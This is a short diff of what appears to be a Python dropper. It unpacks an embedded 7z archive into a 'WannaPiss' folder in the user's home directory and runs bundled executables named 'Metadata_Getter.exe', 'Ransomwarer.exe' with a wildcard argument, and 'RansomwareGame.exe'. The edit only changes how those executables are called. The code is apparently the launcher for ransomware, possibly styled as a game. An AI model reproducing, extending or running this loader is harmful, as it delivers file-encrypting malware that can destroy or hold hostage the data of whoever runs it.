@@ -9,6 +9,6 @@ bio = BytesIO(compressed_data_bytes)
 home = os.path.expanduser("~") + "/"
 wp_dir = home + "WannaPiss/"
 py7zr.unpack_7zarchive(bio, wp_dir)
-call("./Metadata_Getter.exe", cwd=wp_dir, shell=True)
-call("./Ransomwarer.exe e '*'", cwd=wp_dir, shell=True)
-call("./RansomwareGame.exe", cwd=wp_dir, shell=True)
+call("Metadata_Getter.exe", cwd=wp_dir, shell=True)
+call("Ransomwarer.exe e '*'", cwd=wp_dir, shell=True)
+call("RansomwareGame.exe", cwd=wp_dir, shell=True)
